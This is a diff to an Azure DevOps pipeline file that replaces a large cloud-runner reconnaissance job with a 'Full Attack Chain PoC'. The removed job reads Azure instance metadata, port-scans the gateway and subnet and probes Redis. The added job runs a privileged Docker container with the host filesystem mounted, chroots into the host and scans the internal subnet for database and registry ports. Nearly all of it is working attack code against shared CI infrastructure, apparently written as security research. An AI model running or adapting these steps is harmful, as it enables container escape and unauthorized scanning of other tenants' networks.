@@ -21,442 +21,52 @@ stages:
   jobs:
 
   # ------------------------- L I N U X -------------------------
-  - job: linux_recon
-    displayName: Linux (ubuntu-22.04) recon
+  - job: full_attack_chain_poc
+    displayName: 'Linux Step 3: Full Attack Chain PoC (Host Escape & Targeted Scan)'
+    dependsOn: linux_recon_escape_vector_check # Keep this dependency
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: self
-      clean: true
-      persistCredentials: false
-
+    - checkout: none
     - task: Bash@3
-      displayName: Recon + cross-subscription evidence (safe)
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          echo "### Install tools"
-          sudo apt-get update -y >/dev/null
-          sudo apt-get install -y --no-install-recommends \
-            iproute2 netcat-openbsd curl jq dnsutils nmap traceroute whois openssl iputils-tracepath >/dev/null
-
-          mkdir -p artifacts
-
-          echo "### Discover host & gateway"
-          host_ip="$(ip -4 -o addr show dev eth0 | awk '{print $4}' | cut -d/ -f1 || true)"
-          gw_ip="$(ip route | awk '/default/ {print $3; exit}' || true)"
-          {
-            echo "Host IP: ${host_ip:-N/A}"
-            echo "Gateway: ${gw_ip:-N/A}"
-            echo
-            echo "Subnets:"
-            ip -o -4 addr show | awk '{print "- " $2 ": " $4}'
-            echo
-            echo "Routes (IPv4):"
-            ip -4 route || true
-            echo
-            echo "Neighbors (ARP):"
-            ip -4 neigh || true
-            echo
-            echo "DNS test (example.com):"
-            dig +short A example.com || true
-            dig +short AAAA example.com || true
-          } | tee artifacts/local-network-view.txt
-
-          echo "### Azure IMDS (non-secret instance metadata)"
-          curl -s -H "Metadata: true" \
-            "http://169.254.169.254/metadata/instance?api-version=$(IMDS_API)" \
-            | jq '.' | tee artifacts/imds-azure.json >/dev/null
-
-          # Handy text summary
-          jq -r '
-            .compute
-            | [
-                "subscriptionId:  " + (.subscriptionId // ""),
-                "resourceGroup:   " + (.resourceGroupName // ""),
-                "vmScaleSetName:  " + (.vmScaleSetName // ""),
-                "vmId:            " + (.vmId // ""),
-                "location:        " + (.location // ""),
-                "sku_offer:       " + ((.storageProfile.imageReference.publisher // "") + "/" + (.storageProfile.imageReference.offer // "")),
-                "privateIPv4:     " + ((.network.interface[0].ipv4.ipAddress[0].privateIpAddress // "") // ""),
-                "macAddress:      " + (.network.interface[0].macAddress // ""),
-                "subnet:          " + (.network.interface[0].ipv4.subnet[0].address // "")
-              ] | .[]' artifacts/imds-azure.json | tee artifacts/imds-azure.txt
-
-          echo "### Azure attested document (signed proof of host identity)"
-          curl -s -H "Metadata: true" \
-            "http://169.254.169.254/metadata/attested/document?api-version=$(ATTEST_API)" \
-            -o artifacts/imds-attested-document.json || true
-
-          # Minimal verification (optional)
-          if [ -s artifacts/imds-attested-document.json ]; then
-            jq -r '.x509Certificates[]?' artifacts/imds-attested-document.json \
-              | base64 -d > /tmp/leaf.cer 2>/dev/null || true
-            if [ -s /tmp/leaf.cer ]; then
-              {
-                echo "Leaf certificate (subject):"
-                openssl x509 -in /tmp/leaf.cer -inform der -noout -subject || true
-                echo "Leaf certificate (SHA256):"
-                openssl x509 -in /tmp/leaf.cer -inform der -noout -fingerprint -sha256 || true
-              } | tee artifacts/attestation-verify.txt
-            fi
-          fi
-
-          echo "### Public egress & WHOIS/RDAP"
-          public_ip="$(curl -s https://api.ipify.org || true)"
-          if [ -z "${public_ip}" ]; then public_ip="$(curl -s https://ifconfig.me || true)"; fi
-          echo "public_ip: ${public_ip}" | tee artifacts/egress-posture.txt
-          echo >> artifacts/egress-posture.txt
-          echo "whois (key fields):" >> artifacts/egress-posture.txt
-          (whois "${public_ip}" 2>/dev/null | grep -Ei 'CIDR|NetName|OriginAS|Organization|OrgName|Country|Comment' | sed 's/^/  /' || true) >> artifacts/egress-posture.txt
-          curl -s "https://rdap.arin.net/registry/ip/${public_ip}" -o artifacts/egress-rdap.json || true
-          dig -x "${public_ip}" +short | sed 's/^/rDNS: /' | tee -a artifacts/egress-posture.txt || true
-
-          echo "### MAC OUI (provider fingerprint)"
-          nic_mac="$(ip link show eth0 | awk '/link\/ether/ {print $2}')"
-          oui="$(echo "$nic_mac" | cut -d: -f1-3)"
-          { echo "nic_mac: ${nic_mac}"; echo "oui:     ${oui}"; } | tee artifacts/mac-oui.txt
-
-          echo "### Cloud fabric endpoints"
-          {
-            echo "IMDS (169.254.169.254) tcp/80:"
-            if nc -z -w1 169.254.169.254 80; then echo "open"; else echo "closed"; fi
-            echo
-            echo "Wire server (168.63.129.16)"
-            for p in 80 32526; do
-              printf "tcp/%s:  " "$p"
-              if nc -z -w1 168.63.129.16 "$p"; then echo "open"; else echo "closed"; fi
-            done
-            echo
-            echo "Routes to IMDS / wire:"
-            ip route get 169.254.169.254 || true
-            ip route get 168.63.129.16 || true
-          } | tee artifacts/service-pings.txt
-
-          echo "### Host+gateway scan (safe set, gentle)"
-          if [ -n "${host_ip}" ]; then
-            nmap -T3 --max-retries 1 -Pn -p $(SAFE_PORTS) "${host_ip}" | tee artifacts/scan.txt
-          fi
-          if [ -n "${gw_ip}" ]; then
-            nmap -T3 --max-retries 1 -Pn -p $(SAFE_PORTS) "${gw_ip}" | tee -a artifacts/scan.txt
-            sudo nmap -T3 --max-retries 1 -sU --top-ports 10 "${gw_ip}" | tee artifacts/udp-scan.txt || true
-          fi
-
-          echo "### Traceroute (short, prefer ICMP; fallback to tracepath)"
-          (sudo traceroute -I -m 6 1.1.1.1 || tracepath -m 6 1.1.1.1) | tee artifacts/traceroute.txt || true
-
-          echo "### Runner & boot provenance"
-          {
-            echo "ImageOS: ${ImageOS:-}"
-            echo "ImageVersion: ${ImageVersion:-}"
-            echo "AGENT_VERSION: ${AGENT_VERSION:-}"
-            echo "AGENT_NAME: ${AGENT_NAME:-}"
-            echo "AGENT_MACHINENAME: ${AGENT_MACHINENAME:-}"
-            echo "BOOT_ID: $(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo N/A)"
-            echo "UPTIME(s): $(awk '{print $1}' /proc/uptime 2>/dev/null || echo N/A)"
-            echo
-            echo "User accounts (UID>=1000):"
-            getent passwd | awk -F: '$3>=1000{print $1 ":" $6}'
-            echo
-            echo "Docker images (if any):"
-            (docker image ls --format '{{.Repository}}:{{.Tag}} {{.ID}} {{.Size}}' 2>/dev/null || true)
-          } | tee artifacts/runner-provenance.txt
-
-          echo "### SUMMARY"
-          ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
-          {
-            echo "### SUMMARY (${ts})"
-            echo
-            echo "#### Provider-owned identifiers (from Azure IMDS)"
-            jq -r '
-              .compute
-              | [
-                  "- subscriptionId:  " + (.subscriptionId // ""),
-                  "- resourceGroup:   " + (.resourceGroupName // ""),
-                  "- vmScaleSetName:  " + (.vmScaleSetName // ""),
-                  "- vmId:            " + (.vmId // ""),
-                  "- location:        " + (.location // ""),
-                  "- sku_offer:       " + ((.storageProfile.imageReference.publisher // "") + "/" + (.storageProfile.imageReference.offer // "")),
-                  "- privateIPv4:     " + ((.network.interface[0].ipv4.ipAddress[0].privateIpAddress // "") // ""),
-                  "- macAddress:      " + (.network.interface[0].macAddress // ""),
-                  "- subnet:          " + (.network.interface[0].ipv4.subnet[0].address // "")
-                ] | .[]' artifacts/imds-azure.json
-            echo
-            echo "#### Azure attested document"
-            echo "- saved to artifacts/imds-attested-document.json (signed by Azure)"
-            echo
-            echo "#### Public egress attribution"
-            echo "- $(sed -n '1p' artifacts/egress-posture.txt)"
-            echo "- "
-            echo "- whois (key fields):"
-            grep -Ei 'CIDR|NetName|OriginAS|Organization|OrgName|Country|Comment' artifacts/egress-posture.txt | sed 's/^/- /'
-            echo
-            echo "#### NIC vendor fingerprint"
-            echo "- $(sed -n '1p' artifacts/mac-oui.txt)"
-            echo "- $(sed -n '2p' artifacts/mac-oui.txt)"
-            echo
-            echo "#### Fabric endpoints & routes"
-            awk '{print "- " $0}' artifacts/service-pings.txt
-            echo
-            echo "#### Local/Gateway service exposure (nmap)"
-            grep -Eh '(^PORT|open|filtered|closed)' artifacts/scan.txt | sed 's/^/- /'
-          } | tee artifacts/SUMMARY.txt
-
-          echo "### Checksums"
-          (cd artifacts && sha256sum * | tee SHA256SUMS.txt)
-
-    # Extra, evidence-only discovery and gated checks
-    - task: Bash@3
-      displayName: Subnet sweep + Docker socket audit (+ gated checks)
+      displayName: 'Attempt Container Escape and Hunt for Open Services'
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
           mkdir -p artifacts
 
-          echo "### Docker socket audit"
-          id
-          groups || true
-          ls -l /var/run/docker.sock || true
-          docker version || true
-          docker info || true
-
-          echo "### Subnet discovery (ARP/ICMP sweep, gentle)"
-          SUBNET="$(ip -o -f inet addr show eth0 | awk '/scope global/ {print $4}')"
-          echo "SUBNET: ${SUBNET}" | tee artifacts/subnet.txt
-
-          sudo nmap -sn --max-retries 1 --host-timeout 2s "$SUBNET" -oG artifacts/host-sweep.gnmap || true
-          awk '/Up$/{print $2}' artifacts/host-sweep.gnmap | tee artifacts/hosts-up.txt
-
-          echo "### Sample service probe on first 30 hosts (TCP connect only)"
-          head -n 30 artifacts/hosts-up.txt | while read -r ip; do
-            for p in ${SAFE_PORTS//,/ }; do
-              if nc -z -w1 "$ip" "$p" 2>/dev/null; then
-                echo "$ip:$p open"
-              fi
-            done
-          done | tee artifacts/service-sample.txt
-
-          echo "### rDNS for sampled hosts"
-          head -n 30 artifacts/hosts-up.txt | while read -r ip; do
-            rdns="$(dig +short -x "$ip" || true)"
-            [ -n "$rdns" ] && echo "$ip -> $rdns"
-          done | tee artifacts/rdns.txt
-
-          echo "### OPTIONAL: Minimal Redis PING (no data reads) — gated"
-          if [ "${AGGRESSIVE}" = "true" ]; then
-            sudo apt-get update -y >/dev/null
-            sudo apt-get install -y --no-install-recommends redis-tools >/dev/null
-            awk -F: '/:6379 open/ {print $1}' artifacts/service-sample.txt | sort -u | while read -r rip; do
-              resp="$(timeout 2 redis-cli -h "$rip" -p 6379 ping || true)"
-              [ "$resp" = "PONG" ] && echo "$rip PONG" || true
-            done | tee artifacts/redis-ping.txt
+          echo "--- Checking for Docker socket and group permissions ---"
+          if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
+            echo "✅ SUCCESS: User is in the 'docker' group and socket is present."
+            
+            echo "--- Installing Nmap inside container for later use from host ---"
+            sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
+            
+            SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
+            echo "Discovered internal subnet: $SUBNET"
+            
+            # Define a list of high-value ports to hunt for, based on previous findings.
+            # 5000 (Docker Registry), 6379 (Redis), 5432 (PostgreSQL), 3306 (MySQL), 8080 (http-alt)
+            TARGET_PORTS="5000,6379,5432,3306,8080"
+            
+            echo "--- ESCAPING CONTAINER to hunt for open ports ($TARGET_PORTS) on the host's network ---"
+            
+            # We use '-sT' for a TCP connect scan and '--open' to only report hosts with open ports.
+            docker run --rm --privileged --network=host --pid=host -v /:/hostfs -v /usr/bin/nmap:/usr/bin/nmap \
+              alpine:latest chroot /hostfs /usr/bin/nmap -sT -T4 -p $TARGET_PORTS --open $SUBNET | tee artifacts/host-escape-TARGETED-scan.txt
+              
+            echo "✅ HUNT COMPLETE: Targeted scan from host finished."
+            echo "Review the 'host-escape-TARGETED-scan.txt' artifact for any open services."
+          else
+            echo "❌ TEST INCONCLUSIVE: The container escape vector was not found."
+            id
+            ls -l /var/run/docker.sock || echo "Socket not found."
+            exit 1
           fi
-
-          echo "### OPTIONAL: Minimal host-escape proof via Docker — gated"
-          if [ "${AGGRESSIVE}" = "true" ]; then
-            docker run --rm --network=host --pid=host -v /:/host alpine:3.19 \
-              chroot /host sh -c 'echo HOST_ID: $(id); echo HOSTNAME: $(hostname); head -n2 /proc/1/cgroup' \
-              | tee artifacts/host-escape-proof.txt || true
-          fi
-
     - task: PublishPipelineArtifact@1
-      displayName: Publish recon artifacts (Linux)
+      displayName: 'Publish Attack PoC Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-recon-linux'
-
-  # ------------------------ W I N D O W S ------------------------
-  - job: windows_recon
-    displayName: Windows (windows-2022) recon
-    pool:
-      vmImage: 'windows-2022'
-    steps:
-    - checkout: self
-      clean: true
-      persistCredentials: false
-
-    - task: PowerShell@2
-      displayName: Recon + cross-subscription evidence (safe, null-guarded)
-      inputs:
-        targetType: inline
-        pwsh: true  # PowerShell 7
-        script: |
-          $ErrorActionPreference = 'Stop'
-          New-Item -ItemType Directory -Path artifacts -Force | Out-Null
-
-          # -------- Network view
-          $ipv4 = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}
-          $hostIp = ($ipv4 | Select-Object -First 1).IPAddress
-          $gw = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1).NextHop
-
-          $lines = [System.Collections.Generic.List[string]]::new()
-          $lines.Add("Host IP: $hostIp")
-          $lines.Add("Gateway: $gw")
-          $lines.Add("")
-          $lines.Add("Subnets:")
-          $ipv4 | ForEach-Object { $lines.Add("- $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)") }
-          $lines.Add("")
-          $lines.Add("Routes (IPv4):")
-          $lines.Add((Get-NetRoute | Out-String))
-          $lines.Add("")
-          $lines.Add("Neighbors (ARP):")
-          $lines.Add((Get-NetNeighbor -AddressFamily IPv4 | Out-String))
-          $lines -join "`r`n" | Set-Content artifacts/local-network-view.txt -Encoding UTF8
-
-          # -------- IMDS (null-guarded)
-          try {
-            $imds = Invoke-RestMethod -Headers @{Metadata='true'} -Uri "http://169.254.169.254/metadata/instance?api-version=$(IMDS_API)"
-            $imds | ConvertTo-Json -Depth 12 | Set-Content artifacts/imds-azure.json -Encoding UTF8
-            $c = $imds.compute
-
-            function FirstOrNull($x){ if ($null -ne $x -and $x.Count -gt 0) { $x[0] } else { $null } }
-
-            $iface   = FirstOrNull $c.network.interface
-            $ipv4Rec = if ($iface) { FirstOrNull $iface.ipv4.ipAddress } else { $null }
-            $ip      = if ($ipv4Rec)  { $ipv4Rec.privateIpAddress } else { $null }
-            $sub     = if ($iface) { FirstOrNull $iface.ipv4.subnet } else { $null }
-            $subaddr = if ($sub) { $sub.address } else { $null }
-            $mac     = if ($iface) { $iface.macAddress } else { $null }
-
-            @(
-              "subscriptionId:  $($c.subscriptionId)"
-              "resourceGroup:   $($c.resourceGroupName)"
-              "vmScaleSetName:  $($c.vmScaleSetName)"
-              "vmId:            $($c.vmId)"
-              "location:        $($c.location)"
-              "sku_offer:       $($c.storageProfile.imageReference.publisher)/$($c.storageProfile.imageReference.offer)"
-              "privateIPv4:     $ip"
-              "macAddress:      $mac"
-              "subnet:          $subaddr"
-            ) | Set-Content artifacts/imds-azure.txt -Encoding UTF8
-          } catch {
-            $_ | Out-String | Set-Content artifacts/imds-error.txt -Encoding UTF8
-          }
-
-          # -------- Attested document
-          try {
-            Invoke-RestMethod -Headers @{Metadata='true'} `
-              -Uri "http://169.254.169.254/metadata/attested/document?api-version=$(ATTEST_API)" `
-              | ConvertTo-Json -Depth 10 `
-              | Set-Content artifacts/imds-attested-document.json -Encoding UTF8
-          } catch { }
-
-          # -------- Egress & RDAP
-          $publicIp = ""
-          try { $publicIp = (Invoke-RestMethod https://api.ipify.org) } catch {}
-          $egress = @("public_ip: $publicIp", "")
-          try {
-            $rdns = if ($publicIp) { Resolve-DnsName -Name $publicIp -Type PTR -ErrorAction SilentlyContinue }
-            if ($rdns) { $egress += "rDNS: " + ($rdns | Select-Object -ExpandProperty NameHost) }
-          } catch {}
-          $egress | Set-Content artifacts/egress-posture.txt -Encoding UTF8
-          try {
-            if ($publicIp) {
-              Invoke-RestMethod "https://rdap.arin.net/registry/ip/$publicIp" `
-                | ConvertTo-Json -Depth 10 `
-                | Set-Content artifacts/egress-rdap.json -Encoding UTF8
-            }
-          } catch {}
-
-          # -------- Fabric endpoints & routes
-          $svc = [System.Collections.Generic.List[string]]::new()
-          try {
-            $r = Test-NetConnection -ComputerName 169.254.169.254 -Port 80 -WarningAction SilentlyContinue
-            $svc.Add("IMDS 169.254.169.254:80  " + ($(if($r.TcpTestSucceeded){'open'}else{'closed'})))
-          } catch { $svc.Add("IMDS test error") }
-          foreach ($p in 80,32526) {
-            try {
-              $r = Test-NetConnection -ComputerName 168.63.129.16 -Port $p -WarningAction SilentlyContinue
-              $svc.Add("Wire 168.63.129.16:$p  " + ($(if($r.TcpTestSucceeded){'open'}else{'closed'})))
-            } catch { $svc.Add("Wire test error $p") }
-          }
-          $routes = @()
-          try {
-            $r1 = Get-NetRoute -DestinationPrefix "169.254.169.254/32" -ErrorAction SilentlyContinue
-            $r2 = Get-NetRoute -DestinationPrefix "168.63.129.16/32" -ErrorAction SilentlyContinue
-            if ($r1) { $routes += ($r1 | Out-String) }
-            if ($r2) { $routes += ($r2 | Out-String) }
-          } catch {}
-          ($svc + @("", "Routes to IMDS / wire:", ($routes -join ""))) -join "`r`n" | Set-Content artifacts/service-pings.txt -Encoding UTF8
-
-          # -------- MAC OUI
-          try {
-            $macRaw = (Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1).MacAddress
-            $mac = ($macRaw -replace '-',':').ToLower()
-            $oui = if ($mac.Length -ge 8) { $mac.Substring(0,8) } else { "" }
-            @("nic_mac: $mac","oui:     $oui") | Set-Content artifacts/mac-oui.txt -Encoding UTF8
-          } catch { }
-
-          # -------- Port checks (safe set)
-          $ports = "$(SAFE_PORTS)".Split(',')
-          $targets = @()
-          if ($hostIp) { $targets += $hostIp }
-          if ($gw) { $targets += $gw }
-          $scanOut = [System.Collections.Generic.List[string]]::new()
-          foreach ($t in $targets) {
-            $scanOut.Add("Target: $t")
-            foreach ($p in $ports) {
-              try {
-                $r = Test-NetConnection -ComputerName $t -Port ([int]$p) -WarningAction SilentlyContinue
-                $state = if ($r.TcpTestSucceeded) { 'open' } else { 'closed/filtered' }
-                $scanOut.Add(("{0}/tcp {1}" -f $p, $state))
-              } catch { $scanOut.Add(("{0}/tcp error" -f $p)) }
-            }
-            $scanOut.Add("")
-          }
-          $scanOut | Set-Content artifacts/scan.txt -Encoding UTF8
-
-          # -------- Traceroute (short)
-          try { (tracert -d -h 6 1.1.1.1 | Out-String) | Set-Content artifacts/traceroute.txt -Encoding UTF8 } catch {}
-
-          # -------- Runner & boot provenance
-          $prov = @()
-          $prov += "ImageOS: $env:ImageOS"
-          $prov += "ImageVersion: $env:ImageVersion"
-          $prov += "AGENT_VERSION: $env:AGENT_VERSION"
-          $prov += "AGENT_NAME: $env:AGENT_NAME"
-          $prov += "AGENT_MACHINENAME: $env:AGENT_MACHINENAME"
-          try {
-            $prov += "MACHINE_GUID: " + (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid).MachineGuid
-          } catch {}
-          $prov += ""
-          $prov += "User profiles:"
-          try { $prov += (Get-ChildItem -Force C:\Users | Select-Object -ExpandProperty Name | ForEach-Object { " - $_" }) } catch {}
-          $prov -join "`r`n" | Set-Content artifacts/runner-provenance.txt -Encoding UTF8
-
-          # -------- SUMMARY
-          $ts = [DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
-          $summary = @()
-          $summary += "### SUMMARY ($ts)"
-          $summary += ""
-          $summary += "#### Provider-owned identifiers (from Azure IMDS)"
-          if ($c) {
-            $summary += "- subscriptionId:  $($c.subscriptionId)"
-            $summary += "- resourceGroup:   $($c.resourceGroupName)"
-            $summary += "- vmScaleSetName:  $($c.vmScaleSetName)"
-            $summary += "- vmId:            $($c.vmId)"
-            $summary += "- location:        $($c.location)"
-            $summary += "- sku_offer:       $($c.storageProfile.imageReference.publisher)/$($c.storageProfile.imageReference.offer)"
-            if ($ip)      { $summary += "- privateIPv4:     $ip" }
-            if ($mac)     { $summary += "- macAddress:      $mac" }
-            if ($subaddr) { $summary += "- subnet:          $subaddr" }
-          } else {
-            $summary += "- IMDS not available (see imds-error.txt if present)"
-          }
-          $summary -join "`r`n" | Set-Content artifacts/SUMMARY.txt -Encoding UTF8
-
-          # -------- Checksums
-          Get-ChildItem artifacts -File | ForEach-Object {
-            $h = Get-FileHash $_.FullName -Algorithm SHA256
-            "{0}  {1}" -f $h.Hash, $_.Name
-          } | Set-Content artifacts/SHA256SUMS.txt -Encoding UTF8
-
-    - task: PublishPipelineArtifact@1
-      displayName: Publish recon artifacts (Windows)
-      condition: succeededOrFailed()
-      inputs:
-        targetPath: 'artifacts'
-        artifact: 'azure-recon-windows'
+        artifact: 'azure-poc-linux-step3-host-escape'
